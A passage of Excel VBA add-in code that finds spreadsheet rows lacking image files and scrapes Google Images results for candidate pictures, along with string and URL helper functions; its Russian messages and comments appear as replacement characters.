        MsgBox msg, vbCritical, "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Exit Sub
    End If

    Dim ra As Range: Set ra = GetSourceDataRange
    If ra Is Nothing Then Exit Sub

    Set ra = Intersect(Selection.EntireRow, ra)
    If ra Is Nothing Then
        msg$ = "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
               "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."
        MsgBox msg, vbCritical, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
        Exit Sub
    End If

    With F_SearchImages
        .Show
        Set .CellsWithoutPictures = ra
        .CWP_index = 1
        .PrepareForSearch True
    End With
End Sub

Sub FindPicturesInInternet()
    On Error Resume Next: Err.Clear
    If Not VisiblePI Is Nothing Then VisiblePI.Hide
    Dim ra As Range: Set ra = GetRowsWithoutImages
    If ra Is Nothing Then Exit Sub

    With F_SearchImages
        .Show
        Set .CellsWithoutPictures = ra
        .CWP_index = 1
        .PrepareForSearch
    End With
End Sub


Function GetRowsWithoutImages() As Range
    On Error Resume Next
    Dim coll As Collection, cell As Range, ra As Range, n&, pi As New ProgressIndicator

    pi.Show "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    pi.CancelButton.Visible = False
    pi.StartNewAction 2, 20, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| ...", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ..."
    Set ra = GetSourceDataRange
    If ra Is Nothing Then pi.Hide: Exit Function

    pi.StartNewAction 20, 30, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|...", PICTURES_FOLDER$
    Set coll = FilenamesCollection(PICTURES_FOLDER$, "*")
    If coll.Count = 0 Then Set GetRowsWithoutImages = ra: pi.Hide: Exit Function

    cellscount& = ra.Cells.Count

    pi.StartNewAction 30, 100, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| ...", , , cellscount& \ 200
    For Each cell In ra.Cells
        picpath$ = GetPicturePathForCell(cell, coll)
        If Len(picpath$) = 0 Then
            If GetRowsWithoutImages Is Nothing Then
                Set GetRowsWithoutImages = cell
            Else
                Set GetRowsWithoutImages = Union(GetRowsWithoutImages, cell)
            End If
        End If
        n = n + 1
        If n Mod 200 = 0 Then
            pi.SubAction , "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| " & n & " |fffd||fffd| " & cellscount&, "$time"
            DoEvents
        End If
    Next cell
    pi.Hide
    DoEvents
    If GetRowsWithoutImages Is Nothing Then
        msg$ = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
               "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."
        MsgBox msg, vbCritical, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
    End If
End Function


'Private Sub test93283453454729()
'    On Error Resume Next: Err.Clear
'    Dim coll As Collection, FI As FoundImage
'    Static IE As Object
'    Set coll = GetGooglePictures(ActiveCell, 15, IE)
'
'    Debug.Print coll.Count
'    For Each FI In coll
'        Debug.Print FI.Width & "x" & FI.Height, FI.URL
'    Next
'End Sub

Function RussianStringToURLEncode_New(ByVal txt As String) As String
    For i = 1 To Len(txt)
        l = Mid(txt, i, 1)
        Select Case AscW(l)
            Case Is > 4095: t = "%" & Hex(AscW(l) \ 64 \ 64 + 224) & "%" & Hex(AscW(l) \ 64) & "%" & Hex(8 * 16 + AscW(l) Mod 64)
            Case Is > 127: t = "%" & Hex(AscW(l) \ 64 + 192) & "%" & Hex(8 * 16 + AscW(l) Mod 64)
            Case 32: t = "%20"
            Case Else: t = l
        End Select
        RussianStringToURLEncode_New = RussianStringToURLEncode_New & t
    Next
End Function

Function GetGooglePictures(ByVal query$, Optional ByVal MaxCount& = 20, _
                           Optional ByRef IE As Object) As Collection
    On Error Resume Next: Err.Clear
    Set GetGooglePictures = New Collection
    If Trim(query$) = "" Then Exit Function
    Dim FI As FoundImage

    sURL_1$ = "https://www.google.ru/search?hl=ru&newwindow=1&safe=off&tbo=d&source=lnms&tbm=isch&q="
    sURL$ = RussianStringToURLEncode_New(Trim(query$))

    IEclosed = IE Is Nothing
    'If IEclosed Then
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.  |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd|...
    Set IE = CreateObject("InternetExplorer.Application")        ': Debug.Print "Run IE"        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Internet Explorer

    DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents
    IE.Navigate sURL_1$ & sURL$        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
    DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents
    'IE.Visible = True

    If IE Is Nothing Then Exit Function        ' |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|-|fffd||fffd|...
    ' |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    t = Timer: While (IE.busy Or (IE.readyState <> 4)) And (Timer - t < 10): DoEvents: Wend
    If IE.busy Or (IE.readyState <> 4) Then
        ' IE |fffd||fffd||fffd||fffd||fffd||fffd|
        IE.Quit: DoEvents
        Set IE = CreateObject("InternetExplorer.Application"): Debug.Print "Restart IE"        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| IE |fffd||fffd||fffd||fffd||fffd||fffd|
        DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents
        IE.Navigate sURL_1$ & sURL$        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
        DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents

        t = Timer: While (IE.busy Or (IE.readyState <> 4)) And (Timer - t < 15): DoEvents: Wend
        If IE.busy Or (IE.readyState <> 4) Then
            ' IE |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
            IE.Quit: DoEvents
            MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Internet Explorer", _
                   vbExclamation, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
            Exit Function
        End If
    End If

    DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents
    txt$ = IE.Document.body.innerHTML        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    ' If IEclosed Then IE.Quit: Set IE = Nothing     ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|

    txt = Replace(txt, "\u003d", "=")
    arr = Split(txt, "imgurl=")
    If UBound(arr) = 0 Then
        t = Timer: While Timer - t < 1: DoEvents: Wend        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| IE |fffd||fffd||fffd||fffd||fffd| )
        Exit Function
    End If

    Dim item_html$, w&, H&
    For i = 1 To UBound(arr)
        item_html$ = Replace(arr(i), "&amp;", "&")
        prewiew$ = "": prewiew$ = TextBetween(item_html$, """tu"":""", """", 1)
        w& = Val(TextBetween(item_html$, "&w=", "&", 1))
        H& = Val(TextBetween(item_html$, "&h=", "&", 1))

        If CheckWidthAndHeightOfFoundImage(w, H) And (item_html$ Like "http*") Then
            Set FI = New FoundImage
            FI.SearchProvider = "Google"
            FI.URL = URLencodeToString(Split(arr(i), "&amp;")(0))
            FI.Website = Split(FI.URL, "/")(2)
            FI.prewiewURL = prewiew$
            FI.Width = w&
            FI.Height = H&

            '            Debug.Print FI.URL
            '            Debug.Print FI.prewiewURL
            '            Debug.Print
            GetGooglePictures.Add FI
            'If GetGooglePictures.Count >= MaxCount& Then Exit Function
        End If
    Next i
    IE.Quit: DoEvents
End Function


Function CheckWidthAndHeightOfFoundImage(ByVal w&, ByVal H&) As Boolean
    On Error Resume Next
    If w * H = 0 Then Exit Function
    If SETT.GetBoolean("CheckBox_FI_AnyImageSize") Then
        CheckWidthAndHeightOfFoundImage = True
    Else
        w1& = SETT.GetNumber("SpinButton_FI_W_min")
        w2& = SETT.GetNumber("SpinButton_FI_W_max")
        h1& = SETT.GetNumber("SpinButton_FI_H_min")
        h2& = SETT.GetNumber("SpinButton_FI_H_max")
        settingsOK = ((w1 >= 0) And (w2 > 0) And (w2 >= w1)) And ((h1 >= 0) And (h2 > 0) And (h2 >= h1))
        If settingsOK Then
            CheckWidthAndHeightOfFoundImage = ((w >= w1) And (w <= w2) And (H >= h1) And (H <= h2))
        Else
            CheckWidthAndHeightOfFoundImage = True        ' settings error
        End If
    End If
End Function




Function GetGooglePicturesNew2(ByVal query$, Optional ByVal MaxCount& = 20) As Collection
    On Error Resume Next: Err.Clear
    Set GetGooglePicturesNew2 = New Collection
    If Trim(query$) = "" Then Exit Function
    Dim FI As FoundImage, sURL$, filename$, HTTP As WinHttpRequest

    sURL$ = "https://www.google.ru/search?tbm=isch&q=" & RussianStringToURLEncode_New(Trim(query$))
    '  https://www.google.ru/search?tbm=isch&q=%D1%8D%D0%BA%D1%81%D0%B5%D0%BB%D1%8C

    Set HTTP = New WinHttpRequest
    With HTTP
        .Open "GET", sURL$, False
        .SetRequestHeader "Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
        .SetRequestHeader "Accept-Language", "en-US,en;q=0.8"
        .SetRequestHeader "Cache-Control", "no-cache"
        .SetRequestHeader "Pragma", "no-cache"
        '.SetRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Tablet PC 2.0; .NET4.0C; AskTbPTV2/5.9.1.14019)"
        .SetRequestHeader "User-Agent", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)"
        .SetRequestHeader "X-Compress", "null"
        .Send

        txt = .ResponseText
    End With

    'ShowText txt
    arr = Split(GetTags(txt, "div", "class", "rg_meta", "innerHTML"), ARSEP)
    If UBound(arr) <= 0 Then Debug.Print "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|": Exit Function

    Dim json$, w&, H&
    For i = LBound(arr) To UBound(arr)
        json$ = JSON_decode(arr(i))
        prewiew$ = "": prewiew$ = TextBetween(json$, """tu"":""", """", 1)
        w& = Val(TextBetween(json$, """ow"":", ",", 1))
        H& = Val(TextBetween(json$, """oh"":", ",", 1))
        'Debug.Print prewiew$

        If CheckWidthAndHeightOfFoundImage(w, H) Then
            Set FI = New FoundImage
            FI.SearchProvider = "GoogleNew"
            FI.URL = TextBetween(json$, """ou"":""", """", 1)
            FI.Website = Replace(Split(FI.URL, "/")(2), "www.", "")
            FI.prewiewURL = prewiew$
            FI.Width = w&
            FI.Height = H&

            '            Debug.Print FI.URL
            '            Debug.Print FI.prewiewURL
            '            Debug.Print
            GetGooglePicturesNew2.Add FI
        End If
    Next i
End Function



Function GetGooglePicturesNew(ByVal query$, Optional ByVal MaxCount& = 20) As Collection
    On Error Resume Next: Err.Clear
    Set GetGooglePicturesNew = New Collection
    If Trim(query$) = "" Then Exit Function
    Dim FI As FoundImage, sURL$, filename$

    sURL$ = "https://www.google.ru/search?tbm=isch&q=" & RussianStringToURLEncode_New(Trim(query$))
    '  https://www.google.ru/search?tbm=isch&q=%D1%8D%D0%BA%D1%81%D0%B5%D0%BB%D1%8C

    filename$ = FWF.temp_filename & ".html"
    If FWF.DownLoadFileFromURL(sURL$, filename$) Then
        Debug.Print filename$
        txt = FWF.ReadTXTfile(filename$)
    Else
        Debug.Print "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| Google |fffd| |fffd||fffd||fffd||fffd|"
        Exit Function
    End If
    Kill filename$
    'txt = GetHTTPResponse(sURL$)

    'ShowText txt
    arr = Split(GetTags(txt, "div", "class", "rg_meta", "innerHTML"), ARSEP)
    If UBound(arr) = 0 Then Debug.Print "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|": Exit Function

    Dim json$, w&, H&
    For i = LBound(arr) To UBound(arr)
        json$ = JSON_decode(arr(i))
        prewiew$ = "": prewiew$ = TextBetween(json$, """tu"":""", """", 1)
        w& = Val(TextBetween(json$, """ow"":", ",", 1))
        H& = Val(TextBetween(json$, """oh"":", ",", 1))
        'Debug.Print prewiew$

        If CheckWidthAndHeightOfFoundImage(w, H) Then
            Set FI = New FoundImage
            FI.SearchProvider = "GoogleNew"
            FI.URL = TextBetween(json$, """ou"":""", """", 1)
            FI.Website = Replace(Split(FI.URL, "/")(2), "www.", "")
            FI.prewiewURL = prewiew$
            FI.Width = w&
            FI.Height = H&

            '            Debug.Print FI.URL
            '            Debug.Print FI.prewiewURL
            '            Debug.Print
            GetGooglePicturesNew.Add FI
        End If
    Next i
End Function

Function GetHTTPResponse(ByVal sURL As String) As String
    On Error Resume Next
    Set oXMLHTTP = CreateObject("MSXML2.XMLHTTP")
    With oXMLHTTP
        .Open "GET", sURL, False
        .Send: DoEvents
        GetHTTPResponse = .ResponseText
        '        Debug.Print .StatusText
        '        Debug.Print Val(.Status)
    End With
    Set oXMLHTTP = Nothing
End Function


'Function GetGooglePictures(ByVal query$, Optional ByVal maxCount& = 20, _
 '                           Optional ByRef IE As Object) As Collection
'    On Error Resume Next: Err.Clear
'    Set GetGooglePictures = New Collection
'    If Trim(query$) = "" Then Exit Function
'    Dim FI As FoundImage
'
'    sURL_1$ = "https://www.google.ru/search?hl=ru&newwindow=1&safe=off&tbo=d&source=lnms&tbm=isch&q="
'    sURL$ = RussianStringToURLEncode_New(Trim(query$))
'
'    IEclosed = IE Is Nothing
'    'If IEclosed Then
'    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.  |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd|...
'    Set IE = CreateObject("InternetExplorer.Application")        ': Debug.Print "Run IE"        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Internet Explorer
'
'    DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents
'    IE.Navigate sURL_1$ & sURL$        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
'    DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents
'    'IE.Visible = True
'
'    If IE Is Nothing Then Exit Function        ' |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|-|fffd||fffd|...
'    ' |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
'    t = Timer: While (IE.busy Or (IE.readyState <> 4)) And (Timer - t < 10): DoEvents: Wend
'    If IE.busy Or (IE.readyState <> 4) Then
'        ' IE |fffd||fffd||fffd||fffd||fffd||fffd|
'        IE.Quit: DoEvents
'        Set IE = CreateObject("InternetExplorer.Application"): Debug.Print "Restart IE"        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| IE |fffd||fffd||fffd||fffd||fffd||fffd|
'        DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents
'        IE.Navigate sURL_1$ & sURL$        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
'        DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents
'
'        t = Timer: While (IE.busy Or (IE.readyState <> 4)) And (Timer - t < 15): DoEvents: Wend
'        If IE.busy Or (IE.readyState <> 4) Then
'            ' IE |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
'            IE.Quit: DoEvents
'            MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Internet Explorer", _
             '                   vbExclamation, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
'            Exit Function
'        End If
'    End If
'
'    DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents: DoEvents
'    txt$ = IE.Document.body.innerHTML        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
'    ' If IEclosed Then IE.Quit: Set IE = Nothing     ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
'
'    txt = Replace(txt, "\u003d", "=")
'    arr = Split(txt, "imgurl=")
'    If UBound(arr) = 0 Then
'        t = Timer: While Timer - t < 1: DoEvents: Wend        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| IE |fffd||fffd||fffd||fffd||fffd| )
'        Exit Function
'    End If
'
'    Dim item_html$, W&, H&
'    For i = 1 To UBound(arr)
'        item_html$ = Replace(arr(i), "&amp;", "&")
'        prewiew$ = "": prewiew$ = TextBetween(item_html$, """tu"":""", """", 1)
'        W& = Val(TextBetween(item_html$, "&w=", "&", 1))
'        H& = Val(TextBetween(item_html$, "&h=", "&", 1))
'
'        If CheckWidthAndHeightOfFoundImage(W, H) And (item_html$ Like "http*") Then
'            Set FI = New FoundImage
'            FI.SearchProvider = "Google"
'            FI.URL = URLencodeToString(Split(arr(i), "&amp;")(0))
'            FI.Website = Split(FI.URL, "/")(2)
'            FI.prewiewURL = prewiew$
'            FI.Width = W&
'            FI.Height = H&
'
'            '            Debug.Print FI.URL
'            '            Debug.Print FI.prewiewURL
'            '            Debug.Print
'            GetGooglePictures.Add FI
'            'If GetGooglePictures.Count >= MaxCount& Then Exit Function
'        End If
'    Next i
'    IE.Quit: DoEvents
'End Function
'
Attribute VB_Name = "mod__NEW_functions"
'---------------------------------------------------------------------------------------
' Module        : mod__NEW                    Version:
' Author        : Igor Vakhnenko                   Date: 16.04.2016
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Public Const ARSEP$ = "~|01||03||02|~"

Function RemoveExtraSeparators(ByRef txt$, Optional ByVal sep$ = ARSEP)
    On Error Resume Next
    If sep$ = "" Then Exit Function
    Dim sep2$: sep2$ = sep$ & sep$
    While InStr(1, txt$, sep2$, vbBinaryCompare): txt$ = Replace(txt$, sep2$, sep$): Wend
    If txt$ Like "*" & sep$ Then txt = Left(txt, Len(txt) - Len(sep$))
    If txt$ Like sep$ & "*" Then txt = Mid(txt, Len(sep$) + 1)
End Function

Function TextBetween(ByVal txt$, ByVal part1$, ByVal part2$, Optional ResultIndex$ = "") As String
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| TXT |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| part1$,
    ' |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| part2$
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ARSEP$)
    On Error Resume Next
    Dim arr, i, res$, ind&
    Select Case ""
        Case part1$ & part2$
            TextBetween = txt
            Exit Function
        Case part1$
            arr = Split(txt, part2$)
            arr(UBound(arr)) = ""
        Case part2$
            arr = Split(txt, part1$)
            arr(0) = ""
        Case Else
            arr = Split(txt, part1$)
            arr(0) = ""
            For i = LBound(arr) To UBound(arr)
                If InStr(1, arr(i), part2$, vbTextCompare) Then arr(i) = Split(arr(i), part2$)(0) Else arr(i) = ""
            Next i
    End Select
    txt = Join(arr, ARSEP)
    RemoveExtraSeparators txt

    If Len(ResultIndex$) * Len(txt) Then        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        If InStr(1, ResultIndex$, "last", vbTextCompare) > 0 Then
            ind& = UBound(Split(txt, ARSEP)) + Val(Split(ResultIndex$, "last")(1))
        Else
            ind& = Fix(Val(ResultIndex$)) - 1
        End If

        If ind& >= 0 And ind& <= UBound(Split(txt, ARSEP)) Then
            txt = Split(txt, ARSEP)(ind&)
        Else
            If ResultIndex$ Like "*#*" Then txt = ""
        End If
    End If

    TextBetween = txt
End Function

Function URLencodeToString(ByVal StringToDecode As String) As String
    StringToDecode = Replace(StringToDecode, "%20", "")
    Dim TempAns As String, CurChr As Long
    CurChr = 1
    Do Until CurChr - 1 >= Len(StringToDecode)
        Select Case Mid(StringToDecode, CurChr, 1)
            Case "+"
                TempAns = TempAns & " "
            Case "%"
                v1 = Val("&H" & Mid(StringToDecode, CurChr + 1, 2))
                TempAns = TempAns & ChrW(v1)
                CurChr = CurChr + 2
            Case Else
                TempAns = TempAns & Mid(StringToDecode, CurChr, 1)
        End Select
        CurChr = CurChr + 1
    Loop
    URLencodeToString = TempAns
End Function


Function GetTags(ByVal txt$, ByVal TagName$, Optional ByVal AttrName$, Optional ByVal AttrValue$, Optional ByVal Result$ = "outerHTML", _
                 Optional ByVal ReplaceType$, Optional ByVal ReplacePattern$) As String
